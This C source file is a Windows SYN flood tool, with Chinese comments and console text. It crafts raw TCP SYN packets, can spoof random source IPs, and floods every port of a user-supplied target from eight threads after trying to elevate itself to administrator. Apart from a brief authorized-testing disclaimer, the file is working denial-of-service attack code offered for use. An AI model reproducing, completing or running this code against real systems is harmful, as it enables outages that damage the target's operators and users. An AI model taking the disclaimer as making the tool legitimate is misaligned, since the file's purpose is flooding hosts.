#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <mstcpip.h>
#include <process.h>
#include <stdint.h>
#include <locale.h>
#include <windows.h>
#include <fcntl.h>
#include <io.h>
#include <conio.h>

#define MAX_PORTS 65535
#define THREAD_COUNT 8
#define PACKET_SIZE 1024

// 定义IP头
typedef struct ip_header {
    unsigned char  ver_ihl;
    unsigned char  tos;
    unsigned short total_length;
    unsigned short id;
    unsigned short frag_off;
    unsigned char  ttl;
    unsigned char  protocol;
    unsigned short checksum;
    unsigned int   saddr;
    unsigned int   daddr;
} IP_HEADER;

// 定义TCP头
typedef struct tcp_header {
    unsigned short sport;
    unsigned short dport;
    unsigned int   seq;
    unsigned int   ack;
    unsigned char  data_offset;
    unsigned char  flags;
    unsigned short window;
    unsigned short checksum;
    unsigned short urg_ptr;
} TCP_HEADER;

// 伪头部用于校验和
typedef struct pseudo_header {
    unsigned int saddr;
    unsigned int daddr;
    unsigned char zero;
    unsigned char protocol;
    unsigned short tcp_length;
} PSEUDO_HEADER;

// 全局变量
SOCKET raw_sock = INVALID_SOCKET;
struct sockaddr_in dest_addr;
int attack_active = 1;
volatile LONG packets_sent = 0;
clock_t start_time;
unsigned int local_ip = 0;
char target_ip_str[16] = {0};

// 设置控制台编码为UTF-8
void set_console_encoding() {
    // 设置控制台为UTF-8编码
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
    
    // 设置C运行时库的本地化
    setlocale(LC_ALL, "en_US.UTF-8");
    
    // 设置宽字符支持
    _setmode(_fileno(stdout), _O_U16TEXT);
    _setmode(_fileno(stdin), _O_U16TEXT);
    _setmode(_fileno(stderr), _O_U16TEXT);
    
    // 设置控制台字体
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_FONT_INFOEX font = { sizeof(CONSOLE_FONT_INFOEX) };
    GetCurrentConsoleFontEx(hConsole, FALSE, &font);
    wcscpy(font.FaceName, L"Consolas");
    SetCurrentConsoleFontEx(hConsole, FALSE, &font);
}

// 计算校验和
unsigned short calculate_checksum(unsigned short *buffer, int size) {
    unsigned long cksum = 0;
    while (size > 1) {
        cksum += *buffer++;
        size -= sizeof(unsigned short);
    }
    if (size) cksum += *(unsigned char*)buffer;
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (unsigned short)(~cksum);
}

// 获取本地IP地址
unsigned int get_local_ip(const char* target_ip) {
    SOCKET temp_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (temp_sock == INVALID_SOCKET) {
        wprintf(L"创建临时套接字失败: %d\n", WSAGetLastError());
        return INADDR_NONE;
    }
    
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(target_ip);
    if (target.sin_addr.s_addr == INADDR_NONE) {
        closesocket(temp_sock);
        return INADDR_NONE;
    }
    target.sin_port = htons(80);
    
    if (connect(temp_sock, (struct sockaddr*)&target, sizeof(target)) == SOCKET_ERROR) {
        wprintf(L"连接测试失败: %d\n", WSAGetLastError());
        closesocket(temp_sock);
        return INADDR_NONE;
    }
    
    struct sockaddr_in local;
    int addr_len = sizeof(local);
    if (getsockname(temp_sock, (struct sockaddr*)&local, &addr_len) == SOCKET_ERROR) {
        wprintf(L"获取本地地址失败: %d\n", WSAGetLastError());
        closesocket(temp_sock);
        return INADDR_NONE;
    }
    
    unsigned int result = local.sin_addr.s_addr;
    closesocket(temp_sock);
    return result;
}

// 发送SYN包到指定端口
void send_syn_to_port(int port) {
    char packet[sizeof(IP_HEADER) + sizeof(TCP_HEADER)];
    memset(packet, 0, sizeof(packet));
    
    // 填充IP头
    IP_HEADER *iph = (IP_HEADER *)packet;
    iph->ver_ihl = (4 << 4) | (sizeof(IP_HEADER) / sizeof(unsigned int));
    iph->tos = 0;
    iph->total_length = htons(sizeof(packet));
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 128;
    iph->protocol = IPPROTO_TCP;
    
    if (local_ip == INADDR_NONE) {
        iph->saddr = htonl(rand() % 0xFFFFFFFF);
    } else {
        iph->saddr = local_ip;
    }
    
    iph->daddr = dest_addr.sin_addr.s_addr;
    iph->checksum = 0;
    iph->checksum = calculate_checksum((unsigned short *)iph, sizeof(IP_HEADER));
    
    // 填充TCP头
    TCP_HEADER *tcph = (TCP_HEADER *)(packet + sizeof(IP_HEADER));
    tcph->sport = htons(rand() % 16383 + 49152); // 49152-65535动态端口
    tcph->dport = htons(port);
    tcph->seq = htonl(rand());
    tcph->ack = 0;
    tcph->data_offset = (sizeof(TCP_HEADER) / 4) << 4;
    tcph->flags = 0x02; // SYN标志
    tcph->window = htons(64240);
    tcph->urg_ptr = 0;
    tcph->checksum = 0;
    
    // 伪头部用于校验和计算
    PSEUDO_HEADER psh;
    psh.saddr = iph->saddr;
    psh.daddr = iph->daddr;
    psh.zero = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(TCP_HEADER));
    
    char *pseudo_packet = (char *)malloc(sizeof(PSEUDO_HEADER) + sizeof(TCP_HEADER));
    if (!pseudo_packet) return;
    
    memcpy(pseudo_packet, &psh, sizeof(PSEUDO_HEADER));
    memcpy(pseudo_packet + sizeof(PSEUDO_HEADER), tcph, sizeof(TCP_HEADER));
    tcph->checksum = calculate_checksum((unsigned short *)pseudo_packet, 
                                       sizeof(PSEUDO_HEADER) + sizeof(TCP_HEADER));
    free(pseudo_packet);
    
    // 发送数据包
    sendto(raw_sock, packet, sizeof(packet), 0, 
           (struct sockaddr *)&dest_addr, sizeof(dest_addr));
}

// 攻击线程函数
unsigned __stdcall attack_thread(void *param) {
    int thread_id = (int)(uintptr_t)param;
    int port = 1;
    
    while (attack_active) {
        for (port = 1 + thread_id; port <= MAX_PORTS; port += THREAD_COUNT) {
            if (!attack_active) break;
            send_syn_to_port(port);
            InterlockedIncrement(&packets_sent);
            
            // 每1000个包休息1ms防止CPU过载
            if (packets_sent % 1000 == 0) {
                Sleep(1);
            }
        }
    }
    return 0;
}

// 显示统计信息
void show_stats() {
    while (attack_active) {
        double elapsed = (double)(clock() - start_time) / CLOCKS_PER_SEC;
        double pps = (elapsed > 0.1) ? (packets_sent / elapsed) : 0;
        
        wprintf(L"\r攻击中 | 目标: %hs | 发送: %ld 包 | 速率: %.1f pps | 持续时间: %.1f 秒",
               inet_ntoa(dest_addr.sin_addr), packets_sent, pps, elapsed);
        fflush(stdout);
        
        Sleep(1000);
    }
}

// 显示法律声明
void show_disclaimer() {
    wprintf(L"=====================================================\n");
    wprintf(L"             SYN洪水攻击工具 (全端口遍历)             \n");
    wprintf(L"=====================================================\n");
    wprintf(L"法律声明: 本工具仅用于授权安全测试\n");
    wprintf(L"          禁止用于非法攻击活动\n");
    wprintf(L"          使用者需对自身行为负全部法律责任\n");
    wprintf(L"          仅限测试自有服务器或获得明确授权的系统\n");
    wprintf(L"=====================================================\n\n");
}

// 检查管理员权限
int is_admin() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        return 0;
    }
    
    TOKEN_ELEVATION elevation;
    DWORD dwSize;
    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
        CloseHandle(hToken);
        return 0;
    }
    
    CloseHandle(hToken);
    return elevation.TokenIsElevated;
}

// 自动提升为管理员权限
void elevate_to_admin() {
    wchar_t path[MAX_PATH];
    if (GetModuleFileNameW(NULL, path, MAX_PATH)) {
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpVerb = L"runas";
        sei.lpFile = path;
        sei.hwnd = NULL;
        sei.nShow = SW_NORMAL;
        
        if (!ShellExecuteExW(&sei)) {
            DWORD err = GetLastError();
            if (err == ERROR_CANCELLED) {
                wprintf(L"用户取消了权限提升请求\n");
            } else {
                wprintf(L"权限提升失败 (错误代码: %d)\n", err);
            }
        } else {
            exit(0); // 成功启动管理员进程，退出当前进程
        }
    }
}

// 获取用户输入的目标IP地址
void get_target_ip() {
    wprintf(L"\n请输入目标IP地址 (例如: 192.168.1.100): ");
    
    // 使用宽字符读取输入
    wchar_t wip_input[16];
    _getws(wip_input);
    
    // 转换为多字节字符串
    WideCharToMultiByte(CP_UTF8, 0, wip_input, -1, target_ip_str, sizeof(target_ip_str), NULL, NULL);
    
    // 验证IP地址格式
    struct in_addr addr;
    addr.s_addr = inet_addr(target_ip_str);
    if (addr.s_addr == INADDR_NONE) {
        wprintf(L"错误: 无效的IP地址格式!\n");
        wprintf(L"请按以下格式输入: XXX.XXX.XXX.XXX\n");
        get_target_ip(); // 递归调用直到输入有效
    }
}

int main() {
    // 设置控制台编码和字体
    set_console_encoding();
    
    // 显示法律声明
    show_disclaimer();
    
    // 检查管理员权限
    if (!is_admin()) {
        wprintf(L"警告: 需要管理员权限运行此程序!\n");
        wprintf(L"正在尝试自动提升权限...\n");
        elevate_to_admin();
        
        // 如果提升失败，再次检查权限
        if (!is_admin()) {
            wprintf(L"错误: 请以管理员身份手动运行此程序!\n");
            wprintf(L"1. 右键点击CMD/PowerShell\n");
            wprintf(L"2. 选择'以管理员身份运行'\n");
            wprintf(L"3. 然后执行此程序\n");
            wprintf(L"\n按任意键退出...");
            _getwch();
            return 1;
        }
    }
    
    // 获取目标IP地址
    get_target_ip();
    
    // 初始化Winsock
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        wprintf(L"WSAStartup失败: %d\n", WSAGetLastError());
        wprintf(L"\n按任意键退出...");
        _getwch();
        return 1;
    }
    
    // 获取本地IP地址
    wprintf(L"正在确定本地IP地址...\n");
    local_ip = get_local_ip(target_ip_str);
    if (local_ip == INADDR_NONE) {
        wprintf(L"警告: 无法确定本地IP，将使用随机源IP\n");
    } else {
        struct in_addr addr;
        addr.s_addr = local_ip;
        wprintf(L"使用本地IP: %hs\n", inet_ntoa(addr));
    }
    
    // 创建原始套接字
    wprintf(L"正在创建原始套接字...\n");
    raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_sock == INVALID_SOCKET) {
        int error = WSAGetLastError();
        wprintf(L"创建原始套接字失败: %d\n", error);
        
        // 尝试替代方案
        wprintf(L"尝试使用IPPROTO_IP...\n");
        raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
        
        if (raw_sock == INVALID_SOCKET) {
            error = WSAGetLastError();
            wprintf(L"创建原始套接字失败: %d\n", error);
            
            if (error == WSAEACCES) {
                wprintf(L"请确认以管理员身份运行此程序\n");
            } else {
                wprintf(L"未知错误，请检查网络设置\n");
            }
            wprintf(L"\n按任意键退出...");
            _getwch();
            WSACleanup();
            return 1;
        }
    }
    
    // 设置IP头包含选项
    int hincl = 1;
    if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, (char *)&hincl, sizeof(hincl)) == SOCKET_ERROR) {
        wprintf(L"设置IP_HDRINCL失败: %d\n", WSAGetLastError());
        closesocket(raw_sock);
        wprintf(L"\n按任意键退出...");
        _getwch();
        WSACleanup();
        return 1;
    }
    
    // 设置目标地址
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(target_ip_str);
    
    if (dest_addr.sin_addr.s_addr == INADDR_NONE) {
        wprintf(L"无效的目标IP地址: %hs\n", target_ip_str);
        closesocket(raw_sock);
        wprintf(L"\n按任意键退出...");
        _getwch();
        WSACleanup();
        return 1;
    }
    
    // 初始化随机数生成器
    srand((unsigned int)time(NULL));
    
    wprintf(L"\n启动对 %hs 的SYN洪水攻击...\n", target_ip_str);
    wprintf(L"攻击端口范围: 1-%d\n", MAX_PORTS);
    wprintf(L"使用线程数: %d\n", THREAD_COUNT);
    wprintf(L"按任意键停止攻击\n\n");
    
    start_time = clock();
    
    // 创建攻击线程
    HANDLE threads[THREAD_COUNT];
    for (int i = 0; i < THREAD_COUNT; i++) {
        threads[i] = (HANDLE)_beginthreadex(NULL, 0, attack_thread, (void *)(uintptr_t)i, 0, NULL);
        if (threads[i] == NULL) {
            wprintf(L"创建线程 %d 失败\n", i);
            attack_active = 0;
        }
    }
    
    // 创建统计线程
    HANDLE stats_thread = (HANDLE)_beginthreadex(NULL, 0, 
        (unsigned (__stdcall *)(void *))show_stats, NULL, 0, NULL);
    
    // 等待用户停止
    wprintf(L"按任意键停止攻击...\n");
    _getwch(); // 等待任意键
    attack_active = 0;
    
    // 等待线程结束
    wprintf(L"\n正在停止攻击线程...\n");
    WaitForMultipleObjects(THREAD_COUNT, threads, TRUE, 5000);
    WaitForSingleObject(stats_thread, 2000);
    
    // 计算最终统计
    double total_time = (double)(clock() - start_time) / CLOCKS_PER_SEC;
    double avg_pps = (total_time > 0.1) ? (packets_sent / total_time) : 0;
    
    wprintf(L"\n\n攻击已停止!\n");
    wprintf(L"总攻击时间: %.1f 秒\n", total_time);
    wprintf(L"发送数据包总数: %ld\n", packets_sent);
    wprintf(L"平均攻击速率: %.1f 包/秒\n", avg_pps);
    wprintf(L"攻击端口范围: 1-%d\n", MAX_PORTS);
    
    // 关闭线程句柄
    for (int i = 0; i < THREAD_COUNT; i++) {
        CloseHandle(threads[i]);
    }
    CloseHandle(stats_thread);
    
    // 清理资源
    if (raw_sock != INVALID_SOCKET) {
        closesocket(raw_sock);
    }
    WSACleanup();
    
    wprintf(L"\n按任意键退出程序...\n");
    _getwch();
    
    return 0;
}